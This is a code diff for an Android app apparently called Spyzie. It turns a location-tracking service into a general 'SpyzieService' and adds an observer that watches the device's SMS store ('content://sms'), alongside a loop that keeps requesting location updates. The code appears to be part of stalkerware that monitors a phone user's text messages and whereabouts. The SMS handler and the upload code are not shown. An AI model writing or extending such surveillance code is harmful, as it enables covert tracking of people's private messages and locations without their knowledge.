@@ -8,9 +8,12 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.database.ContentObserver;
 import android.location.Location;
 import android.location.LocationManager;
+import android.net.Uri;
 import android.os.Build;
+import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.util.Log;
@@ -27,13 +30,16 @@ import com.google.android.gms.location.LocationServices;
 import com.tantd.spyzie.R;
 import com.tantd.spyzie.SpyzieApplication;
 import com.tantd.spyzie.data.network.ApiManager;
+import com.tantd.spyzie.receiver.SmsObserver;
 import com.tantd.spyzie.util.Constants;
 
 import javax.inject.Inject;
 
-public class LocationService extends Service {
+public class SpyzieService extends Service {
 
     public static final String CHANNEL_ID = "ForegroundServiceChannel";
+
+    private static final String DEBUG_SUB_TAG = "[" + SpyzieService.class.getSimpleName() + "] ";
 
     @Inject
     ApiManager mApiManager;
@@ -45,11 +51,13 @@ public class LocationService extends Service {
     private FusedLocationProviderClient mLocationProviderClient;
     private LocationCallback mLocationCallback;
 
+    private ContentObserver mContentObserver;
+
     @Override
     public void onCreate() {
         SpyzieApplication.getInstance().getAppComponent().inject(this);
         super.onCreate();
-        Log.d(Constants.LOG_TAG, "[LocationService] onCreate()");
+        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onCreate()");
         mLocationProviderClient = LocationServices.getFusedLocationProviderClient(this);
         mLocationCallback = new LocationCallback() {
 
@@ -61,11 +69,15 @@ public class LocationService extends Service {
                 }
             }
         };
+
+        // Fix this: use another Handler
+        mContentObserver = new SmsObserver(new Handler(), this);
+        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mContentObserver);
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(Constants.LOG_TAG, "onStartCommand()");
+        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onStartCommand()");
         createNotificationChannelForAndroidO();
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
@@ -76,11 +88,11 @@ public class LocationService extends Service {
         new Thread(() -> {
             while (true) {
                 if (checkPermissions() && isLocationTurnOn()) {
-                    Log.d(Constants.LOG_TAG, "[LocationService] foreground");
+                    Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "foreground");
                     startForeground(1, notification);
                     requestLocationUpdates();
                 } else {
-                    Log.d(Constants.LOG_TAG, "[LocationService] remove foreground");
+                    Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "remove foreground");
                     removeLocationUpdates();
                     stopForeground(true);
                 }
@@ -99,7 +111,8 @@ public class LocationService extends Service {
 
     @Override
     public void onDestroy() {
-        Log.d(Constants.LOG_TAG, "[LocationService] onDestroy()");
+        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onDestroy()");
+        getContentResolver().unregisterContentObserver(mContentObserver);
         super.onDestroy();
     }
 
